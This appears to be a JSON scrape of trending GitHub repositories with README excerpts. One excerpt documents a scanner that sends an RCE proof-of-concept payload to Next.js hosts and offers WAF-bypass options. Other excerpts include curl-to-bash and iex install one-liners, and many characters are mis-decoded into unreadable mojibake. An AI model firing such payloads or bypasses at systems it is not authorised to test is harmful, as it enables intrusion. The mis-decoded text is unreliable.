å¤šè¯­ç§æ”¯æŒ |\n| ğŸ§­ è§„åˆ’ä¸­ | ç”¨æˆ·ç³»ç»Ÿ |\n\n## ğŸ“¦ ä½¿ç”¨æ–¹æ³•\n\n### ä½¿ç”¨ Docker ComposeğŸ³ï¼ˆæ¨èï¼‰\nè¿™æ˜¯æœ€ç®€å•çš„éƒ¨ç½²æ–¹å¼ï¼Œå¯ä»¥ä¸€é”®å¯åŠ¨å‰åç«¯æœåŠ¡ã€‚\n\n<details>\n  <summary>ğŸ“’Windowsç”¨æˆ·è¯´æ˜</summary>\n\nå¦‚æœä½ ä½¿ç”¨ Windows, è¯·å…ˆå®‰è£… Windows Docker Desktopï¼Œæ£€æŸ¥ç³»ç»Ÿæ‰˜ç›˜ä¸­çš„ Docker å›¾æ ‡ï¼Œç¡®ä¿ Docker æ­£åœ¨è¿è¡Œï¼Œç„¶åä½¿ç”¨ç›¸åŒçš„æ­¥éª¤æ“ä½œã€‚\n\n> **æç¤º**ï¼šå¦‚æœé‡åˆ°é—®é¢˜ï¼Œç¡®ä¿åœ¨ Docker Desktop è®¾ç½®ä¸­å¯ç”¨äº† WSL 2 åç«¯ï¼ˆæ¨èï¼‰ï¼Œå¹¶ç¡®ä¿ç«¯å£ 3000 å’Œ 5000 æœªè¢«å ç”¨ã€‚\n\n</details>\n\n0. **å…‹éš†ä»£ç ä»“åº“**\n```bash\ngit clone https://github.com/Anionex/banana-slides\ncd banana-slides\n```\n\n1. **é…ç½®ç¯å¢ƒå˜é‡**\n\nåˆ›å»º `.env` æ–‡ä»¶ï¼ˆå‚è€ƒ `.env.example`ï¼‰ï¼š\n```bash\ncp .env.example .env\n```\n\nç¼–è¾‘ `.env` æ–‡ä»¶ï¼Œé…ç½®å¿…è¦çš„ç¯å¢ƒå˜é‡ï¼š\n> **é¡¹ç›®ä¸­å¤§æ¨¡å‹æ¥å£ä»¥AIHubMixå¹³å°æ ¼å¼ä¸ºæ ‡å‡†ï¼Œæ¨èä½¿ç”¨ [AIHubMix](https://aihubmix.com/?aff=17EC) è·å–APIå¯†é’¥ï¼Œå‡å°è¿ç§»æˆæœ¬**  \n```env\n# AI Provideræ ¼å¼é…ç½® (gemini / openai)\nAI_PR",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:25.562796"
  },
  {
    "basic_info": {
      "name": "react2shell-scanner",
      "full_name": "assetnote/react2shell-scanner",
      "owner": "assetnote",
      "description": "High Fidelity Detection Mechanism for RSC/Next.js RCE (CVE-2025-55182 & CVE-2025-66478)",
      "url": "https://github.com/assetnote/react2shell-scanner",
      "clone_url": "https://github.com/assetnote/react2shell-scanner.git",
      "ssh_url": "git@github.com:assetnote/react2shell-scanner.git",
      "homepage": null,
      "created_at": "2025-12-04T06:55:04Z",
      "updated_at": "2025-12-14T02:27:43Z",
      "pushed_at": "2025-12-07T04:16:46Z"
    },
    "stats": {
      "stars": 2152,
      "forks": 216,
      "watchers": 2152,
      "open_issues": 9,
      "size": 48
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 27096
      },
      "license": null,
      "topics": []
    },
    "content": {
      "readme": "# react2shell-scanner\n\nA command-line tool for detecting CVE-2025-55182 and CVE-2025-66478 in Next.js applications using React Server Components.\n\nFor technical details on the vulnerability and detection methodology, see our blog post: https://slcyber.io/research-center/high-fidelity-detection-mechanism-for-rsc-next-js-rce-cve-2025-55182-cve-2025-66478\n\n## How It Works\n\nBy default, the scanner sends a crafted multipart POST request containing an RCE proof-of-concept payload that executes a deterministic math operation (`41*271 = 11111`). Vulnerable hosts return the result in the `X-Action-Redirect` response header as `/login?a=11111`.\n\nThe scanner tests the root path (`/`) by default. Use `--path` or `--path-file` to test custom paths. If not vulnerable, it follows same-host redirects (e.g., `/` to `/en/`) and tests the redirect destination. Cross-origin redirects are not followed.\n\n### Safe Check Mode\n\nThe `--safe-check` flag uses an alternative detection method that relies on side-channel indicators (500 status code with specific error digest) without executing code on the target. Use this mode when RCE execution is not desired.\n\n### WAF Bypass\n\nThe `--waf-bypass` flag prepends random junk data to the multipart request body. This can help evade WAF content inspection that only analyzes the first portion of request bodies. The default size is 128KB, configurable via `--waf-bypass-size`. When WAF bypass is enabled, the timeout is automatically increased to 20 seconds (unless explicitly set).\n\n### Vercel WAF Bypass\n\nThe `--vercel-waf-bypass` flag uses an alternative payload variant specifically designed to bypass Vercel WAF protections. This uses a different multipart structure with an additional form field.\n\n### Windows Mode\n\nThe `--windows` flag switches the payload from Unix shell (`echo $((41*271))`) to PowerShell (`powershell -c \"41*271\"`) for targets running on Windows.\n\n## Requirements\n\n- Python 3.9+\n- requests\n- tqdm\n\n## Installation\n\n```\npip install -r requirements.txt\n```\n\n## Usage\n\nScan a single host:\n\n```\npython3 scanner.py -u https://example.com\n```\n\nScan a list of hosts:\n\n```\npython3 scanner.py -l hosts.txt\n```\n\nScan with multiple threads and save results:\n\n```\npython3 scanner.py -l hosts.txt -t 20 -o results.json\n```\n\nScan with custom headers:\n\n```\npython3 scanner.py -u https://example.com -H \"Authorization: Bearer token\" -H \"Cookie: session=abc\"\n```\n\nUse safe side-channel detection:\n\n```\npython3 scanner.py -u https://example.com --safe-check\n```\n\nScan Windows targets:\n\n```\npython3 scanner.py -u https://example.com --windows\n```\n\nScan with WAF bypass:\n\n```\npython3 scanner.py -u https://example.com --waf-bypass\n```\n\nScan custom paths:\n\n```\npython3 scanner.py -u https://example.com --path /_next\npython3 scanner.py -u https://example.com --path /_next --path /api\npython3 scanner.py -u https://example.com --path-file paths.txt\n```\n\n## Options\n\n```\n-u, --url         Single URL to check\n-l, --list        File containing hosts (one per line)\n-t, --threads     Number of concurrent threads (default: 10)\n--timeout         Request timeout in seconds (default: 10)\n-o, --output      Output file for results (JSON)\n--all-results     Save all results, not just vulnerable hosts\n-k, --insecure    Disable SSL certificate verification\n-H, --header      Custom header (can be used multiple times)\n-v, --verbose     Show response details for vulnerable hosts\n-q, --quiet       Only output vulnerable hosts\n--no-color        Disable colored output\n--safe-check      Use safe side-channel detection instead of RCE PoC\n--windows         Use Windows PowerShell payload instead of Unix shell\n--waf-bypass      Add junk data to bypass WAF content inspection\n--waf-bypass-size Size of junk data in KB (default: 128)\n--path            Custom path to test (can be used multiple times)\n--path-file       File containing paths to test (one per line)\n```\n\n## Credits\n\nThe RCE PoC was originally disclosed by [@maple3142](https://x.com/maple3142) -- we are incredibly grateful for their work in publishing a working PoC.\n\nThis tooling originally was built out as a safe way to detect the RCE. This functionality is still available via `--safe-check`, the \"safe detection\" mode.\n\n- Assetnote Security Research Team - [Adam Kues, Tomais Williamson, Dylan Pindur, Patrik GrobshÃ¤user, Shubham Shah](https://x.com/assetnote)\n- [xEHLE_](https://x.com/xEHLE_) - RCE output reflection in resp header\n- [Nagli](https://x.com/galnagli)\n\n## Output\n\nResults are printed to the terminal. When using `-o`, vulnerable hosts are saved to a JSON file containing the full HTTP request and response for verification.\n",
      "default_branch": "master"
    },
    "fetched_at": "2025-12-14T02:54:26.660895"
  },
  {
    "basic_info": {
      "name": "mistral-vibe",
      "full_name": "mistralai/mistral-vibe",
      "owner": "mistralai",
      "description": "Minimal CLI coding agent by Mistral",
      "url": "https://github.com/mistralai/mistral-vibe",
      "clone_url": "https://github.com/mistralai/mistral-vibe.git",
      "ssh_url": "git@github.com:mistralai/mistral-vibe.git",
      "homepage": "",
      "created_at": "2025-12-08T18:56:59Z",
      "updated_at": "2025-12-14T01:50:38Z",
      "pushed_at": "2025-12-12T16:58:05Z"
    },
    "stats": {
      "stars": 1903,
      "forks": 134,
      "watchers": 1903,
      "open_issues": 97,
      "size": 107
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 883854,
        "Nix": 4231,
        "Shell": 3363
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "# Mistral Vibe\n\n[![PyPI Version](https://img.shields.io/pypi/v/mistral-vibe)](https://pypi.org/project/mistral-vibe)\n[![Python Version](https://img.shields.io/badge/python-3.12%2B-blue)](https://www.python.org/downloads/release/python-3120/)\n[![CI Status](https://github.com/mistralai/mistral-vibe/actions/workflows/ci.yml/badge.svg)](https://github.com/mistralai/mistral-vibe/actions/workflows/ci.yml)\n[![License](https://img.shields.io/github/license/mistralai/mistral-vibe)](https://github.com/mistralai/mistral-vibe/blob/main/LICENSE)\n\n```\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ    â–ˆâ–ˆ    â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ          â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆ  â–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆ      â–ˆâ–ˆ      â–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\nâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–ˆâ–‘â–‘\n```\n\n**Mistral's open-source CLI coding assistant.**\n\nMistral Vibe is a command-line coding assistant powered by Mistral's models. It provides a conversational interface to your codebase, allowing you to use natural language to explore, modify, and interact with your projects through a powerful set of tools.\n\n> [!WARNING]\n> Mistral Vibe works on Windows, but we officially support and target UNIX environments.\n\n### One-line install (recommended)\n\n**Linux and macOS**\n\n```bash\ncurl -LsSf https://mistral.ai/vibe/install.sh | bash\n```\n\n**Windows**\n\nFirst, install uv\n```bash\npowershell -ExecutionPolicy ByPass -c \"irm https://astral.sh/uv/install.ps1 | iex\"\n```\n\nThen, use uv command below.\n\n### Using uv\n\n```bash\nuv tool install mistral-vibe\n```\n\n### Using pip\n\n```bash\npip install mistral-vibe\n```\n\n## Features\n\n- **Interactive Chat**: A conversational AI agent that understands your requests and breaks down complex tasks.\n- **Powerful Toolset**: A suite of tools for file manipulation, code searching, version control, and command execution, right from the chat prompt.\n  - Read, write, and patch files (`read_file`, `write_file`, `search_replace`).\n  - Execute shell commands in a stateful terminal (`bash`).\n  - Recursively search code with `grep` (with `ripgrep` support).\n  - Manage a `todo` list to track the agent's work.\n- **Project-Aware Context**: Vibe automatically scans your project's file structure and Git status to provide relevant context to the agent, improving its understanding of your codebase.\n- **Advanced CLI Experience**: Built with modern libraries for a smooth and efficient workflow.\n  - Autocompletion for slash commands (`/`) and file paths (`@`).\n  - Persistent command history.\n  - Beautiful Themes.\n- **Highly Configurable**: Customize models, providers, tool permissions, and UI preferences through a simple `config.toml` file.\n- **Safety First**: Features tool execution approval.\n\n## Quick Start\n\n1. Navigate to your project's root directory:\n\n   ```bash\n   cd /path/to/your/project\n   ```\n\n2. Run Vibe:\n\n   ```bash\n   vibe\n   ```\n\n3. If this is your first time running Vibe, it will:\n\n   - Create a default configuration file at `~/.vibe/config.toml`\n   - Prompt you to enter your API key if it's not already configured\n   - Save your API key to `~/.vibe/.env` for future use\n\n4. Start interacting with the agent!\n\n   ```\n   > Can you find all instances of the word \"TODO\" in the project?\n\n   ğŸ¤– The user wants to find all instances of \"TODO\". The `grep` tool is perfect for this. I will use it to search the current directory.\n\n   > grep(pattern=\"TODO\", path=\".\")\n\n   ... (grep tool output) ...\n\n   ğŸ¤– I found the following \"TODO\" comments in your project.\n   ```\n\n## Usage\n\n### Interactive Mode\n\nSimply run `vibe` to enter the interactive chat loop.\n\n- **Multi-line Input**: Press `Ctrl+J` or `Shift+Enter` for select terminals to insert a newline.\n- **File Paths**: Reference files in your prompt using the `@` symbol for smart autocompletion (e.g., `> Read the file @src/agent.py`).\n- **Shell Commands**: Prefix any command with `!` to execute it directly in your shell, bypassing the agent (e.g., `> !ls -l`).\n\nYou can start Vibe with a prompt with the following command:\n\n```bash\nvibe \"Refactor the main function in cli/main.py to be more modular.\"\n```\n\n**Note**: The `--auto-approve` flag automatically approves all tool executions without prompting. In interactive mode, you can also toggle auto-approve on/off using `Shift+Tab`.\n\n### Programmatic Mode\n\nYou can run Vibe non-interactively by piping input or using the `--prompt` flag. This is useful for scripting.\n\n```bash\nvibe --prompt \"Refactor the main function in cli/main.py to be more modular.\"\n```\n\nby default it will use `auto-approve` mode.\n\n### Slash Commands\n\nUse slash commands for meta-actions and configuration changes during a session.\n\n## Configuration\n\nVibe is configured via a `config.toml` file. It looks for this file first in `./.vibe/config.toml` and then falls back to `~/.vibe/config.toml`.\n\n### API Key Configuration\n\nVibe supports multiple ways to configure your API keys:\n\n1. **Interactive Setup (Recommended for first-time users)**: When you run Vibe for the first time or if your API key is missing, Vibe will prompt you to enter it. The ke",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:27.777362"
  },
  {
    "basic_info": {
      "name": "HunyuanVideo-1.5",
      "full_name": "Tencent-Hunyuan/HunyuanVideo-1.5",
      "owner": "Tencent-Hunyuan",
      "description": "HunyuanVideo-1.5: A leading lightweight video generation model",
      "url": "https://github.com/Tencent-Hunyuan/HunyuanVideo-1.5",
      "clone_url": "https://github.com/Tencent-Hunyuan/HunyuanVideo-1.5.git",
      "ssh_url": "git@github.com:Tencent-Hunyuan/HunyuanVideo-1.5.git",
      "homepage": "https://hunyuan.tencent.com/video/zh?tabIndex=0",
      "created_at": "2025-11-20T06:15:42Z",
      "updated_at": "2025-12-14T01:18:55Z",
      "pushed_at": "2025-12-09T17:04:00Z"
    },
    "stats": {
      "stars": 1890,
      "forks": 91,
      "watchers": 1890,
      "open_issues": 26,
      "size": 641
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 491498
      },
      "license": "Other",
      "topics": [
        "image-to-video",
        "text-to-video",
        "video-generation"
      ]
    },
    "content": {
      "readme": "[ä¸­æ–‡æ–‡æ¡£](./README_CN.md)\n\n# HunyuanVideo-1.5\n\n<div align=\"center\">\n\n<img src=\"./assets/logo.png\" alt=\"HunyuanVideo-1.5 Logo\" width=\"80%\">\n\n# ğŸ¬ HunyuanVideo-1.5: A leading lightweight video generation model\n\n</div>\n\n\n<div align=\"center\">\n<!-- <img src=\"./assets/banner.png\" alt=\"HunyuanVideo-1.5 Banner\" width=\"800\"> -->\n\n</div>\n\n\nHunyuanVideo-1.5 is a video generation model that delivers top-tier quality with only 8.3B parameters, significantly lowering the barrier to usage. It runs smoothly on consumer-grade GPUs, making it accessible for every developer and creator. This repository provides the implementation and tools needed to generate creative videos.\n\n\n<div align=\"center\">\n  <a href=\"https://hunyuan.tencent.com/video/zh?tabIndex=0\" target=\"_blank\"><img src=https://img.shields.io/badge/Official%20Site-333399.svg?logo=homepage height=22px></a>\n  <a href=https://huggingface.co/tencent/HunyuanVideo-1.5 target=\"_blank\"><img src=https://img.shields.io/badge/%F0%9F%A4%97%20Models-d96902.svg height=22px></a>\n  <a href=https://github.com/Tencent-Hunyuan/HunyuanVideo-1.5 target=\"_blank\"><img src= https://img.shields.io/badge/Page-bb8a2e.svg?logo=github height=22px></a>\n  <a href=\"https://arxiv.org/pdf/2511.18870\" target=\"_blank\"><img src=https://img.shields.io/badge/Report-b5212f.svg?logo=arxiv height=22px></a>\n  <a href=https://x.com/TencentHunyuan target=\"_blank\"><img src=https://img.shields.io/badge/Hunyuan-black.svg?logo=x height=22px></a>\n  <a href=\"https://github.com/Tencent-Hunyuan/HunyuanVideo-1.5/blob/main/assets/HunyuanVideo_1_5_Prompt_Handbook_EN.md\" target=\"_blank\"><img src=https://img.shields.io/badge/ğŸ“š-PromptHandBook-blue.svg?logo=book height=22px></a> <br/>\n  <a href=\"./ComfyUI/README.md\" target=\"_blank\"><img src=https://img.shields.io/badge/ComfyUI-blue.svg?logo=book height=22px></a>\n  <a href=\"https://github.com/ModelTC/LightX2V\" target=\"_blank\"><img src=https://img.shields.io/badge/LightX2V-yellow.svg?logo=book height=22px></a>\n  <a href=\"https://tusi.cn/models/933574988890423836\" target=\"_blank\"><img src=https://img.shields.io/badge/åå¸-purple.svg?logo=book height=22px></a>\n  <a href=\"https://tensor.art/models/933574988890423836\" target=\"_blank\"><img src=https://img.shields.io/badge/TensorArt-cyan.svg?logo=book height=22px></a>\n\n</div>\n\n\n<p align=\"center\">\n    ğŸ‘ Join our <a href=\"./assets/wechat.png\" target=\"_blank\">WeChat</a> and <a href=\"https://discord.gg/ehjWMqF5wY\">Discord</a> | \nğŸ’» <a href=\"https://hunyuan.tencent.com/video/zh?tabIndex=0\">Official website Try our model!</a>&nbsp&nbsp\n</p>\n\n## ğŸ”¥ğŸ”¥ğŸ”¥ News\n* ğŸš€ Dec 09, 2025: LoRA tuning script is released, enjoy it! ğŸ”¥ğŸ”¥ğŸ”¥ğŸ†•\n* ğŸš€ Dec 05, 2025: **New Release**: We now release the [480p I2V step-distilled model](https://huggingface.co/tencent/HunyuanVideo-1.5/tree/main/transformer/480p_i2v_step_distilled), which generates videos in 8 or 12 steps (recommended)! On RTX 4090, end-to-end generation time is reduced by 75%, and a single RTX 4090 can generate videos within **75 seconds**. The step-distilled model maintains comparable quality to the original model while achieving significant speedup. See [Step Distillation Comparison](./assets/step_distillation_comparison.md) for detailed quality comparisons. For even faster generation, you can also try 4 steps (faster speed with slightly reduced quality). **To enable the step-distilled model, run `generate.py` with the `--enable_step_distill` parameter.** See [Usage](#-usage) for detailed usage instructions. ğŸ”¥ğŸ”¥ğŸ”¥ğŸ†•\n* ğŸ“š Dec 05, 2025: **Training Code Released**: We now open-source the training code for HunyuanVideo-1.5! The training script (`train.py`) provides a full training pipeline with support for distributed training, FSDP, context parallel, gradient checkpointing, and more. HunyuanVideo-1.5 is trained using the Muon optimizer, which we have open-sourced in the [Training](#-training) section. **If you would like to continue training our model or fine-tune it with LoRA, please use the Muon optimizer.** See [Training](#-training) section for detailed usage instructions. ğŸ”¥ğŸ”¥ğŸ”¥ğŸ†•\n* ğŸ‰ **Diffusers Support**: HunyuanVideo-1.5 is now available on Hugging Face Diffusers! Check out [Diffusers collection](https://huggingface.co/collections/hunyuanvideo-community/hunyuanvideo-15) for easy integration. ğŸ”¥ğŸ”¥ğŸ”¥ğŸ†•\n* ğŸš€ Nov 27, 2025: We now support cache inference (deepcache, teacache, taylorcache), achieving significant speedup! Pull the latest code to try it. ğŸ”¥ğŸ”¥ğŸ”¥ğŸ†• \n* ğŸš€ Nov 24, 2025: We now support deepcache inference.\n* ğŸ‘‹ Nov 20, 2025: We release the inference code and model weights of HunyuanVideo-1.5.\n\n\n## ğŸ¥ Demo\n<div align=\"center\">\n  <video src=\"https://github.com/user-attachments/assets/d45ec78e-ea40-47f1-8d4d-f4d9a0682e2d\" width=\"60%\"> </video>\n</div>\n\n## ğŸ§© Community Contributions\n\nIf you develop/use HunyuanVideo-1.5 in your projects, welcome to let us know.\n\n- **Diffusers** - [HunyuanVideo-1.5 Diffusers](https://huggingface.co/collections/hunyuanvideo-community/hunyuanvideo-15): Official Hugging Face Diffusers integration for",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:28.924675"
  },
  {
    "basic_info": {
      "name": "Paper2Slides",
      "full_name": "HKUDS/Paper2Slides",
      "owner": "HKUDS",
      "description": "\"Paper2Slides: From Paper to Presentation in One Click\"",
      "url": "https://github.com/HKUDS/Paper2Slides",
      "clone_url": "https://github.com/HKUDS/Paper2Slides.git",
      "ssh_url": "git@github.com:HKUDS/Paper2Slides.git",
      "homepage": "",
      "created_at": "2025-12-07T06:15:43Z",
      "updated_at": "2025-12-14T02:23:30Z",
      "pushed_at": "2025-12-10T05:21:57Z"
    },
    "stats": {
      "stars": 1852,
      "forks": 237,
      "watchers": 1852,
      "open_issues": 5,
      "size": 27630
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 550691,
        "JavaScript": 157643,
        "Shell": 11477,
        "CSS": 442,
        "HTML": 404
      },
      "license": "MIT License",
      "topics": [
        "agentic-ai",
        "llm-agents",
        "paper2poster",
        "paper2slides"
      ]
    },
    "content": {
      "readme": "<div align=\"center\">\n\n<img src=\"assets/paper2slides_logo.png\" alt=\"Paper2Slides Logo\" width=\"200\"/><br>\n\n# Paper2Slides: From Paper to Presentation in One Click\n\n[![Python](https://img.shields.io/badge/Python-3.12+-FCE7D6.svg)](https://www.python.org/)\n[![License](https://img.shields.io/badge/License-MIT-C1E5F5.svg)](https://opensource.org/licenses/MIT/)\n[![Feishu](https://img.shields.io/badge/Feishu-Group-E9DBFC?style=flat&logo=wechat&logoColor=white)](./COMMUNICATION.md) \n[![WeChat](https://img.shields.io/badge/WeChat-Group-C5EAB4?style=flat&logo=wechat&logoColor=white)](./COMMUNICATION.md)\n\nâœ¨ **Never Build Slides from Scratch Again** âœ¨\n\n| ğŸ“„ **Universal File Support** &nbsp;|&nbsp; ğŸ¯ **RAG-Powered Precision** &nbsp;|&nbsp; ğŸ¨ **Custom Styling** &nbsp;|&nbsp; âš¡ **Lightning Speed** |\n\n</div>\n\n---\n\n## ğŸ¯ What is Paper2Slides?\n\nTurns your **research papers**, **reports**, and **documents** into **professional slides & posters** in **minutes**.\n\n### âœ¨ Key Features\n- ğŸ“„ **Universal Document Support**<br>\n  Seamlessly process PDF, Word, Excel, PowerPoint, Markdown, and multiple file formats simultaneously.\n  \n- ğŸ¯ **Comprehensive Content Extraction**<br>\n  RAG-powered mechanism ensures every critical insight, figure, and data point is captured with precision.\n  \n- ğŸ”— **Source-Linked Accuracy**<br>\n  Maintains direct traceability between generated content and original sources, eliminating information drift.\n  \n- ğŸ¨ **Custom Styling Freedom**<br>\n  Choose from professional built-in themes or describe your vision in natural language for custom styling.\n  \n- âš¡ **Lightning-Fast Generation**<br>\n  Instant preview mode enables rapid experimentation and real-time refinements.\n  \n- ğŸ’¾ **Seamless Session Management**<br>\n  Advanced checkpoint system preserves all progressâ€”pause, resume, or switch themes instantly without loss.\n  \n- âœ¨ **Professional-Grade Visuals**<br>\n  Deliver polished, presentation-ready slides and posters with publication-quality design standards.\n\n### âš¡ Easy as One Command\n```bash\n# One command to generate slides from a paper\npython -m paper2slides --input paper.pdf --output slides --style doraemon --length medium --fast --parallel 2\n```\n\n---\n\n## ğŸ”¥ News\n\n- **[2025.12.09]** Added parallel slide generation (`--parallel`) for faster processing\n- **[2025.12.08]** Paper2Slides is now open source!\n\n---\n\n## ğŸ¨ Custom Styling Showcase\n\n<div align=\"center\">\n\n<table>\n<tr>\n<td align=\"center\" width=\"290\"><img src=\"assets/doraemon_poster.png?v=2\" width=\"280\"/><br/><code>doraemon</code></td>\n<td align=\"center\" width=\"290\"><img src=\"assets/academic_poster.png?v=2\" width=\"280\"/><br/><code>academic</code></td>\n<td align=\"center\" width=\"290\"><img src=\"assets/totoro_poster.png?v=2\" width=\"280\"/><br/><code>custom</code></td>\n</tr>\n</table>\n\n<table>\n<tr>\n<td align=\"center\" width=\"290\"><a href=\"assets/doraemon_slides.pdf\"><img src=\"assets/doraemon_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>doraemon</code></td>\n<td align=\"center\" width=\"290\"><a href=\"assets/academic_slides.pdf\"><img src=\"assets/academic_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>academic</code></td>\n<td align=\"center\" width=\"290\"><a href=\"assets/totoro_slides.pdf\"><img src=\"assets/totoro_slides_preview.png?v=2\" width=\"280\"/></a><br/><code>custom</code></td>\n</tr>\n</table>\n\n<sub>âœ¨ Multiple styles available â€” simply modify the <code>--style</code> parameter<br/>\nExamples from <a href=\"https://arxiv.org/abs/2512.02556\">DeepSeek-V3.2: Pushing the Frontier of Open Large Language Models</a></sub>\n\n</div>\n\n<details>\n<summary><b>ğŸ’¡ Custom Style Example: Totoro Theme</b></summary>\n\n```\n--style \"Studio Ghibli anime style with warm whimsical aesthetic. Use soft watercolor Morandi tones with light cream background, muted sage green and dusty pink accents. Totoro character can appear as a friendly guide relating to the content, with nature elements like soft clouds or leaves.\"\n```\n\n</details>\n\n---\n\n### ğŸŒ Paper2Slides Web Interface\n\n<div align=\"center\">\n<table>\n<tr>\n<td><img src=\"assets/ui_1.png\" width=\"420\"/></td>\n<td><img src=\"assets/ui_2.png\" width=\"420\"/></td>\n</tr>\n</table>\n</div>\n\n---\n\n## ğŸ“‹ Table of Contents\n\n- [ğŸ¯ Quick Start](#-quick-start)\n- [ğŸ—ï¸ Paper2Slides Framework](#%EF%B8%8F-paper2slides-framework)\n- [ğŸ”§ Configuration](#%EF%B8%8F-configuration)\n- [ğŸ“ Code Structure](#-code-structure)\n\n---\n\n## ğŸƒ Quick Start\n\n### 1. Environment Setup\n\n```bash\n# Clone repository\ngit clone https://github.com/HKUDS/Paper2Slides.git\ncd Paper2Slides\n\n# Create and activate conda environment\nconda create -n paper2slides python=3.12 -y\nconda activate paper2slides\n\n# Install dependencies\npip install -r requirements.txt\n```\n\n> [!NOTE]\n> Create a `.env` file in `paper2slides/` directory with your API keys. Refer to `paper2slides/.env.example` for the required variables.\n\n### 2. Command Line Usage\n\n```bash\n# Basic usage - generate slides from a paper\npython -m paper2slides --input paper.pdf --output slides --length medium\n\n# Generate poster with custom style\npython -m paper2slides ",
      "default_branch": "main"
    },
    "fetched_at": "2025-12-14T02:54:30.032921"
  },
  {
    "basic_info": {
      "name": "DeepSeek-Math-V2",
      "full_name": "deepseek-ai/DeepSeek-Math-V2",
      "owner": "deepseek-ai",
      "description": null,
      "url": "https://github.com/deepseek-ai/DeepSeek-Math-V2",
      "clone_url": "https://github.com/deepseek-ai/DeepSeek-Math-V2.git",
      "ssh_url": "git@github.com:deepseek-ai/DeepSeek-Math-V2.git",
      "homepage": null,
      "created_at": "2025-11-27T06:12:26Z",
      "updated_at": "2025-12-14T02:40:29Z",
      "pushed_at": "2025-12-01T07:01:42Z"
    },
    "stats": {
      "stars": 1472,
      "forks": 113,
      "watchers": 1472,
      "open_issues": 16,
      "size": 1028
    },
    "tech_info": {
      "language": "Python",
      "languages": {
        "Python": 44633,
        "Shell": 620
      },
      "license": "Apache License 2.0",
      "topics": []
    },
    "content": {
      "readme": "<!-- markdownlint-disable first-line-h1 -->\n<!-- markdownlint-disable html -->\n<!-- markdownlint-disable no-duplicate-header -->\n\n<div align=\"center\">\n  <img src=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/logo.svg?raw=true\" width=\"60%\" alt=\"DeepSeek-V3\" />\n</div>\n<hr>\n<div align=\"center\" style=\"line-height: 1;\">\n  <a href=\"https://www.deepseek.com/\"><img alt=\"Homepage\"\n    src=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/badge.svg?raw=true\"/></a>\n  <a href=\"https://chat.deepseek.com/\"><img alt=\"Chat\"\n    src=\"https://img.shields.io/badge/ğŸ¤–%20Chat-DeepSeek%20V3-536af5?color=536af5&logoColor=white\"/></a>\n  <a href=\"https://huggingface.co/deepseek-ai\"><img alt=\"Hugging Face\"\n    src=\"https://img.shields.io/badge/%F0%9F%A4%97%20Hugging%20Face-DeepSeek%20AI-ffc107?color=ffc107&logoColor=white\"/></a>\n  <br>\n  <a href=\"https://discord.gg/Tc7c45Zzu5\"><img alt=\"Discord\"\n    src=\"https://img.shields.io/badge/Discord-DeepSeek%20AI-7289da?logo=discord&logoColor=white&color=7289da\"/></a>\n  <a href=\"https://github.com/deepseek-ai/DeepSeek-V2/blob/main/figures/qr.jpeg?raw=true\"><img alt=\"Wechat\"\n    src=\"https://img.shields.io/badge/WeChat-DeepSeek%20AI-brightgreen?logo=wechat&logoColor=white\"/></a>\n  <a href=\"https://twitter.com/deepseek_ai\"><img alt=\"Twitter Follow\"\n    src=\"https://img.shields.io/badge/Twitter-deepseek_ai-white?logo=x&logoColor=white\"/></a>\n  <br>\n  <a href=\"LICENSE\" style=\"margin: 2px;\">\n    <img alt=\"License\" src=\"https://img.shields.io/badge/License-Apache 2.0-f5de53?&color=f5de53\" style=\"display: inline-block; vertical-align: middle;\"/>\n  </a>\n  <br>\n</div>\n\n# DeepSeekMath-V2: Towards Self-Verifiable Mathematical Reasoning\n\n## 1. Introduction\n\nLarge language models have made significant progress in mathematical reasoning, which serves as an important testbed for AI and could impact scientific research if further advanced.\nBy scaling reasoning with reinforcement learning that rewards correct final answers, LLMs have improved from poor performance to saturating quantitative reasoning competitions like AIME and HMMT in one year.\nHowever, this approach faces fundamental limitations.\nPursuing higher final answer accuracy doesn't address a key issue: correct answers don't guarantee correct reasoning.\nMoreover, many mathematical tasks like theorem proving require rigorous step-by-step derivation rather than numerical answers, making final answer rewards inapplicable.\nTo push the limits of deep reasoning, we believe it is necessary to verify the comprehensiveness and rigor of mathematical reasoning.\nSelf-verification is particularly important for scaling test-time compute, especially for open problems without known solutions.\nTowards self-verifiable mathematical reasoning, we investigate how to train an accurate and faithful LLM-based verifier for theorem proving.\nWe then train a proof generator using the verifier as the reward model, and incentivize the generator to identify and resolve as many issues as possible in their own proofs before finalizing 